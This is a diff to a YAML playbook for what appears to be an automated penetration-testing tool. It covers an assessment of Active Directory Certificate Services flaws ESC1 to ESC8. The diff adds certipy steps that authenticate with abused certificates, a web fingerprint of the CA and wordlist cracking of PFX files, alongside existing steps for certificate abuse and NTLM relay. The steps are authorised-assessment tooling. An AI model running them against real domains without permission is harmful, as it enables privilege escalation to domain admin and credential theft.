@@ -1,6 +1,6 @@
 name: "AD Certificate Services Assessment (ESC1-ESC8)"
 description: "Exploit Active Directory Certificate Services: ESC1 (misconfigured templates), ESC2 (any-purpose EKU), ESC3 (enrollment agent), ESC4 (access control), ESC5 (PKI object permissions), ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2), ESC7 (CA interface), ESC8 (NTLM relay to CA)"
-version: "1.0"
+version: "2.0"
 
 vars:
   domain: ""
@@ -10,6 +10,7 @@ vars:
   username: ""
   password: ""
   hash: ""
+  wordlist: "/wordlists/rockyou.txt"
 
 preflight:
   - id: setup
@@ -42,7 +43,14 @@ steps:
                "-o", "{case_dir}/ldap_pki_objects.txt"]
         timeout: 60
 
-  # ---- Phase 2: ESC1 — Misconfigured template (CT_FLAG_AUTO_ENROLLMENT + ENROLLEE_SUPPLIES_SUBJECT) ----
+      - id: whatweb
+        name: "CA web interface fingerprint"
+        tool: whatweb
+        args: ["-a3", "https://{ca_server}/certsrv",
+               "--log-verbose", "{case_dir}/whatweb-ca.txt"]
+        timeout: 60
+
+  # ---- Phase 2: ESC1 — Misconfigured template ----
   - id: esc1
     name: "ESC1 — Misconfigured certificate template"
     type: sequential
@@ -80,6 +88,14 @@ steps:
                "-o", "{case_dir}/certipy_esc2.pfx"]
         timeout: 120
         artifacts: ["{case_dir}/certipy_esc2.pfx"]
+
+      - id: esc2_auth
+        name: "ESC2 — authenticate with any-purpose cert"
+        tool: certipy
+        args: ["auth", "-pfx", "{case_dir}/certipy_esc2.pfx",
+               "-dc-ip", "{dc_ip}",
+               "-o", "{case_dir}/certipy_esc2_auth"]
+        timeout: 60
 
   # ---- Phase 4: ESC3 — Enrollment agent ----
   - id: esc3
@@ -206,25 +222,47 @@ steps:
         name: "Certipy crack PFX passwords"
         tool: certipy
         args: ["crack", "-pfx", "{case_dir}/*.pfx",
-               "-wordlist", "/wordlists/rockyou.txt",
+               "-wordlist", "{wordlist}",
                "-o", "{case_dir}/certipy_cracked.txt"]
         timeout: 600
         artifacts: ["{case_dir}/certipy_cracked.txt"]
 
   # ---- Phase 11: Report ----
   - id: report
-    name: "ADCS assessment note"
+    name: "ADCS assessment report"
+    type: report
+    format: markdown
+    title: "AD Certificate Services Assessment — {domain}"
+    output: "{case_dir}/adcs-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Domain: {domain}\n- DC IP: {dc_ip}\n- CA: {ca_name} @ {ca_server}"
+      - heading: "PKI Discovery"
+        body: "- Certipy find: {case_dir}/certipy_find\n- LDAP PKI objects: {case_dir}/ldap_pki_objects.txt"
+      - heading: "ESC1 — SAN Injection"
+        body: "- PFX: {case_dir}/certipy_esc1.pfx (auth: {case_dir}/certipy_esc1_auth)"
+      - heading: "ESC2 — Any-Purpose EKU"
+        body: "- PFX: {case_dir}/certipy_esc2.pfx (auth: {case_dir}/certipy_esc2_auth)"
+      - heading: "ESC3 — Enrollment Agent"
+        body: "- Agent PFX: {case_dir}/certipy_esc3_agent.pfx\n- DA PFX: {case_dir}/certipy_esc3_da.pfx"
+      - heading: "ESC4 — Template ACL"
+        body: "- ACL changes: {case_dir}/certipy_esc4"
+      - heading: "ESC5 — PKI ACLs"
+        body: "- ACL dump: {case_dir}/certipy_esc5"
+      - heading: "ESC6 — SAN Bypass"
+        body: "- PFX: {case_dir}/certipy_esc6.pfx"
+      - heading: "ESC7 — CA Manager"
+        body: "- CA info: {case_dir}/certipy_esc7_ca\n- Issued PFX: {case_dir}/certipy_esc7_issued.pfx"
+      - heading: "ESC8 — NTLM Relay"
+        body: "- Captures: {case_dir}/certipy_esc8_relay"
+      - heading: "Cracked PFX"
+        body: "- Cracks: {case_dir}/certipy_cracked.txt"
+
+postflight:
+  - id: cleanup
     type: log
-    message: |
-      ADCS assessment complete for {domain} (CA: {ca_name}).
-      Results in {case_dir}/:
-      - PKI discovery: certipy_find.txt, ldap_pki_objects.txt
-      - ESC1 (SAN injection): certipy_esc1.pfx + auth as DA
-      - ESC2 (any-purpose): certipy_esc2.pfx
-      - ESC3 (enrollment agent): certipy_esc3_da.pfx
-      - ESC4 (template ACL): certipy_esc4
-      - ESC5 (PKI ACLs): certipy_esc5
-      - ESC6 (SAN bypass): certipy_esc6.pfx
-      - ESC7 (CA manager): certipy_esc7_issued.pfx
-      - ESC8 (NTLM relay): certipy_esc8_relay captures
-      - Cracked PFX: certipy_cracked.txt
+    message: "ADCS assessment complete — {case_dir}"
+  - id: notify_done
+    type: notify
+    level: success
+    message: "ADCS assessment finished for {domain}. Results in {case_dir}"
